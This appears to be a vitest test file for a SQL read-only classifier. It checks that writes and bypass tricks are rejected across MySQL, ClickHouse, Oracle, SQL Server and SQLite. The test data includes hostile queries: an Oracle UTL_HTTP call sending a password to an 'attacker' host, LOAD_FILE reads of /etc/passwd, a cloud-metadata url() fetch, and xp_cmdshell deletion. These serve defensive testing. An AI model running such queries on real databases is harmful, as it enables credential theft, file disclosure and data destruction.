import { describe, it, expect } from "vitest";
import type { ConnectorType } from "../../connectors/interface.js";
import { isReadOnlySQL } from "../allowed-keywords.js";

// Multi-statement behaviour (split, then classify each statement) lives in
// src/utils/sql-access-policy.ts and is tested in sql-access-policy.test.ts.
// Everything here is single-statement classification.

/** [what the case shows, dialect, sql] */
type Case = [label: string, dialect: ConnectorType, sql: string];

const allows = (_label: string, dialect: ConnectorType, sql: string) => {
  expect(isReadOnlySQL(sql, dialect)).toBe(true);
};
const rejects = (_label: string, dialect: ConnectorType, sql: string) => {
  expect(isReadOnlySQL(sql, dialect)).toBe(false);
};

describe("isReadOnlySQL", () => {
  // PostgreSQL policy cases live in postgres-sql.test.ts; keep only routing coverage here.
  it.each([
    ["SELECT 1", true],
    [`SELECT pg_catalog."set_config"('search_path', 'public', false)`, false],
    ["not valid SQL", false],
  ] as const)("routes PostgreSQL to the AST classifier: %s", (sql, expected) => {
    expect(isReadOnlySQL(sql, "postgres")).toBe(expected);
  });

  describe("database-specific keywords", () => {
    it.each<Case>([
      ["SHOW", "mysql", "SHOW TABLES"],
      ["DESCRIBE", "mysql", "DESCRIBE users"],
      ["SHOW CREATE TABLE", "mysql", "SHOW CREATE TABLE users"],
      ["SHOW CREATE PROCEDURE", "mariadb", "SHOW CREATE PROCEDURE my_proc"],
      ["EXPLAIN (translated to SHOWPLAN_XML by the connector)", "sqlserver", "EXPLAIN SELECT * FROM users"],
    ])("allows %s (%s)", allows);

    it.each<Case>([
      ["SHOW", "sqlite", "SHOW TABLES"],
      ["standalone ANALYZE (updates statistics)", "mysql", "ANALYZE"],
      ["SHOWPLAN (not a real T-SQL statement)", "sqlserver", "SHOWPLAN SELECT * FROM users"],
      ["bare SET SHOWPLAN_XML (session-scoped, handled via EXPLAIN)", "sqlserver", "SET SHOWPLAN_XML ON"],
    ])("rejects %s (%s)", rejects);
  });

  describe("CTE with mutating operations", () => {
    it.each(["mysql", "sqlite"] as const)(
      "should reject REPLACE INTO (non-function) inside WITH in %s",
      (dialect) => {
        const sql = "WITH cte AS (SELECT 1) REPLACE INTO users VALUES (1, 'test')";
        expect(isReadOnlySQL(sql, dialect)).toBe(false);
      }
    );

    it.each<Case>([
      ["a CTE named 'replace'", "mysql", "WITH replace AS (SELECT 1) SELECT * FROM replace"],
      // MySQL's mutating pattern knows REPLACE INTO; a REPLACE() call must not match it.
      ["REPLACE() inside a WITH CTE", "mysql", "WITH cte AS (SELECT REPLACE(name, 'a', 'b') AS cleaned FROM users) SELECT * FROM cte"],
    ])("allows %s (%s)", allows);
  });

  describe("SELECT INTO", () => {
    it.each<Case>([
      ["SELECT INTO OUTFILE (MySQL)", "mysql", "SELECT * INTO OUTFILE '/tmp/data.csv' FROM users"],
      ["SELECT INTO with WHERE clause", "sqlserver", "SELECT id, name INTO backup_table FROM users WHERE active = true"],
    ])("rejects %s (%s)", rejects);
  });

  describe("ClickHouse keywords", () => {
    it.each<Case>([
      ["SELECT", "clickhouse", "SELECT count() FROM events FINAL"],
      ["WITH", "clickhouse", "WITH 1 AS x SELECT x"],
      ["SHOW", "clickhouse", "SHOW CREATE TABLE events"],
      ["DESCRIBE", "clickhouse", "DESCRIBE TABLE events"],
      ["DESC", "clickhouse", "DESC events"],
      ["EXISTS", "clickhouse", "EXISTS TABLE analytics.events"],
      ["EXPLAIN with settings", "clickhouse", "EXPLAIN indexes = 1 SELECT * FROM events WHERE id = 1"],
      ["EXPLAIN ESTIMATE", "clickhouse", "EXPLAIN ESTIMATE SELECT * FROM events"],
      ["a trailing SETTINGS clause", "clickhouse", "SELECT * FROM events SETTINGS max_threads = 1"],
      ["cluster table functions, which read the same tables on other replicas", "clickhouse", "SELECT * FROM clusterAllReplicas('default', system.query_log)"],
      ["a column or alias named after a table function", "clickhouse", "SELECT url, file, domain(url) AS remote FROM hits"],
      ["a combinator that ends in Merge inside a WITH", "clickhouse", "WITH t AS (SELECT uniqMerge(u) AS u FROM agg) SELECT u FROM t"],
    ])("allows %s", allows);

    it.each<Case>([
      ["INSERT", "clickhouse", "INSERT INTO events VALUES (1)"],
      ["ALTER ... DELETE (a mutation)", "clickhouse", "ALTER TABLE events DELETE WHERE id = 1"],
      ["OPTIMIZE", "clickhouse", "OPTIMIZE TABLE events FINAL"],
      ["SYSTEM", "clickhouse", "SYSTEM FLUSH LOGS"],
      ["SET", "clickhouse", "SET max_threads = 1"],
      ["USE", "clickhouse", "USE analytics"],
      ["KILL", "clickhouse", "KILL QUERY WHERE query_id = 'x'"],
      ["TRUNCATE", "clickhouse", "TRUNCATE TABLE events"],
      ["DETACH", "clickhouse", "DETACH TABLE events"],
      ["SELECT ... INTO OUTFILE", "clickhouse", "SELECT * FROM events INTO OUTFILE 'out.csv'"],
      ["a write hidden behind a // comment line", "clickhouse", "// note\nDROP TABLE events"],
    ])("rejects %s", rejects);

    it.each<Case>([
      ["url()", "clickhouse", "SELECT * FROM url('http://169.254.169.254/latest/meta-data', 'RawBLOB')"],
      ["s3()", "clickhouse", "SELECT * FROM s3('https://bucket.s3.amazonaws.com/x.csv')"],
      ["file()", "clickhouse", "SELECT * FROM file('/etc/passwd', 'LineAsString')"],
      ["remote()", "clickhouse", "SELECT * FROM remote('other:9000', db.t)"],
      ["remoteSecure()", "clickhouse", "SELECT * FROM remoteSecure('other:9440', db.t)"],
      ["mysql()", "clickhouse", "SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')"],
      ["postgresql() in a subquery", "clickhouse", "SELECT count() FROM (SELECT * FROM postgresql('h:5432', 'db', 't', 'u', 'p'))"],
      ["executable()", "clickhouse", "SELECT * FROM executable('script.sh', 'TSV', 'x String')"],
      ["a table function with a space before the parenthesis, in any case", "clickhouse", "SELECT * FROM URL ('http://x', CSV)"],
    ])("rejects %s, which reaches outside the server", rejects);
  });

  describe("Oracle keywords", () => {
    it("allows SELECT, WITH and EXPLAIN [PLAN FOR]", () => {
      expect(isReadOnlySQL("SELECT * FROM dual", "oracle")).toBe(true);
      expect(isReadOnlySQL("WITH x AS (SELECT 1 FROM dual) SELECT * FROM x", "oracle")).toBe(true);
      expect(isReadOnlySQL("EXPLAIN PLAN FOR SELECT * FROM users", "oracle")).toBe(true);
    });

    it("denies PL/SQL blocks and Oracle-specific writes", () => {
      expect(isReadOnlySQL("BEGIN DELETE FROM users; END;", "oracle")).toBe(false);
      expect(isReadOnlySQL("DECLARE n NUMBER; BEGIN NULL; END;", "oracle")).toBe(false);
      expect(isReadOnlySQL("MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = 1", "oracle")).toBe(false);
      expect(isReadOnlySQL("CALL my_proc()", "oracle")).toBe(false);
    });

    it("does not let a q-quoted literal hide a write inside a CTE", () => {
      // The literal's body contains a single quote, so an ANSI scanner would
      // end the string early and expose `DELETE` as plain SQL.
      expect(isReadOnlySQL("WITH x AS (SELECT q'[it's]' AS s FROM dual) SELECT * FROM x", "oracle")).toBe(true);
      expect(isReadOnlySQL("WITH x AS (DELETE FROM t) SELECT q'[x]' FROM dual", "oracle")).toBe(false);
    });
  });

  describe("SQL Server dynamic SQL bypass prevention", () => {
    it.each([
      ["EXEC", "EXEC('DELETE FROM users')"],
      ["EXECUTE", "EXECUTE('DELETE FROM users')"],
      ["EXEC sp_executesql", "EXEC sp_executesql N'DELETE FROM users'"],
    ])("should reject %s as a standalone statement", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
    });

    it.each([
      ["EXEC", "WITH cte AS (SELECT 1) EXEC('DELETE FROM users')"],
      ["EXECUTE", "WITH cte AS (SELECT 1) EXECUTE('DELETE FROM users')"],
      ["implicit sp_executesql (no EXEC prefix)", "WITH cte AS (SELECT 1) sp_executesql N'DELETE FROM users'"],
      ["xp_cmdshell", "WITH cte AS (SELECT 1) xp_cmdshell 'del *.*'"],
    ])("should reject %s inside a CTE", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlserver")).toBe(false);
    });

    it("should not reject EXEC/EXECUTE inside string literals", () => {
      expect(isReadOnlySQL("SELECT * FROM users WHERE name = 'EXEC is a keyword'", "sqlserver")).toBe(true);
    });
  });

  describe("MySQL conditional comment bypass prevention", () => {
    // The scanner's handling of executable comments is pinned in
    // sql-parser.test.ts; these pin the classifier's verdict on them.
    it.each([
      ["mysql", "/*!50000 DELETE FROM users WHERE 1=1 */"],
      ["mariadb", "/*M! DELETE FROM users */"],
    ] as const)("should reject %s executable comment containing DELETE: %s", (dialect, sql) => {
      expect(isReadOnlySQL(sql, dialect)).toBe(false);
    });

    it("should reject even SELECT inside MySQL conditional comment (safe default)", () => {
      // Conditional comment syntax is preserved as plain text, so the first
      // word includes the /*! prefix — safer to deny than to parse the body.
      expect(isReadOnlySQL("/*!50000 SELECT 1 */", "mysql")).toBe(false);
    });

    it("should still strip regular comments for MySQL", () => {
      expect(isReadOnlySQL("/* comment */ SELECT 1", "mysql")).toBe(true);
    });
  });

  describe("SQLite PRAGMA write bypass prevention", () => {
    it("should allow query-form introspection pragmas", () => {
      expect(isReadOnlySQL("PRAGMA user_version", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA journal_mode", "sqlite")).toBe(true);
    });

    it.each([
      ["writing the database header", "PRAGMA user_version = 1337"],
      ["changing durable state", "PRAGMA journal_mode = WAL"],
      ["disabling the read-only backstop", "PRAGMA query_only = OFF"],
      ["without surrounding spaces", "PRAGMA user_version=1"],
    ])("should reject assignment-form pragma %s", (_label, sql) => {
      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
    });

    it.each([
      ["writing the database header", "PRAGMA user_version(1337)"],
      ["changing durable state", "PRAGMA journal_mode(wal)"],
      ["disabling the read-only backstop", "PRAGMA query_only(0)"],
    ])("should reject the parenthesized setter form (equivalent to '= value') %s", (_label, sql) => {
      // SQLite accepts `PRAGMA name(value)` as an alias for `PRAGMA name = value`.
      expect(isReadOnlySQL(sql, "sqlite")).toBe(false);
    });

    it("should still allow introspection pragmas that take a name argument", () => {
      expect(isReadOnlySQL("PRAGMA table_info(users)", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA index_list(users)", "sqlite")).toBe(true);
      expect(isReadOnlySQL("PRAGMA foreign_key_list(orders)", "sqlite")).toBe(true);
    });
  });

  describe("escape-hatch function bypass prevention (issue #377)", () => {
    // Functions callable from a plain SELECT that read the server filesystem or
    // take server-wide locks — a read-only transaction does not contain them.
    it.each([
      ["mysql", "SELECT LOAD_FILE('/etc/passwd')"],
      ["mysql", "SELECT get_lock('x', 10)"],
      ["mysql", "SELECT RELEASE_LOCK('x')"],
      ["mysql", "SELECT RELEASE_ALL_LOCKS()"],
      ["mariadb", "SELECT LOAD_FILE('/etc/passwd')"],
      ["mariadb", "SELECT get_lock('x', 10)"],
      // SQL Server pass-through sources share the same call-position guard:
      // OPENQUERY's payload runs on the remote server, OPENROWSET(BULK) reads
      // server-side files, OPENDATASOURCE opens ad-hoc connections.
      ["sqlserver", "SELECT * FROM OPENQUERY(lnk, 'DELETE FROM customers')"],
      ["sqlserver", "SELECT * FROM OPENROWSET(BULK N'C:\\secrets\\config.ini', SINGLE_CLOB) AS x"],
      ["sqlserver", "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=evil;Trusted_Connection=yes').db.dbo.t"],
      ["sqlserver", "WITH cte AS (SELECT * FROM OPENQUERY(srv, 'DROP TABLE t')) SELECT * FROM cte"],
      // Oracle packages reachable from a SELECT: network/filesystem access
      // and arbitrary code execution, matched on the package prefix.
      ["oracle", "SELECT UTL_HTTP.REQUEST('http://attacker/' || (SELECT password FROM t)) FROM dual"],
      ["oracle", "SELECT utl_inaddr.get_host_address('x') FROM dual"],
      ["oracle", "SELECT DBMS_XSLPROCESSOR.READ2CLOB('DIR', 'passwd') FROM dual"],
      ["oracle", "SELECT dbms_scheduler . create_job('x') FROM dual"],
    ] as const)("rejects %s escape-hatch call: %s", (dialect, sql) => {
      expect(isReadOnlySQL(sql, dialect)).toBe(false);
    });

    it("rejects an escape-hatch call buried in a subquery / FROM clause", () => {
      expect(isReadOnlySQL("SELECT * FROM (SELECT LOAD_FILE('/etc/passwd') AS x) t", "mysql")).toBe(false);
    });

    it.each<Case>([
      ["a column", "mysql", "SELECT load_file FROM documents"],
      ["an alias", "mysql", "SELECT count(*) AS get_lock FROM t"],
      ["a bare column (no call syntax)", "sqlserver", "SELECT openquery FROM logs"],
      ["an identifier that merely starts with the name", "sqlserver", "SELECT openquery_audit FROM logs"],
      ["a column", "oracle", "SELECT utl_http FROM audit_log"],
      ["a table", "oracle", "SELECT * FROM dbms_sql"],
      // A qualified column reference is not a member call.
      ["a qualified column reference", "oracle", "SELECT dbms_sql.foo FROM t dbms_sql"],
      // Each dialect has its own list: pg_read_file is a Postgres function,
      // load_file is MySQL's, and openquery is SQL Server's, so elsewhere even a
      // call of that name is fine.
      ["a column named after another dialect's function", "mysql", "SELECT pg_read_file FROM t"],
    ])("still allows %s named like an escape-hatch function (%s): %s", allows);
  });
});
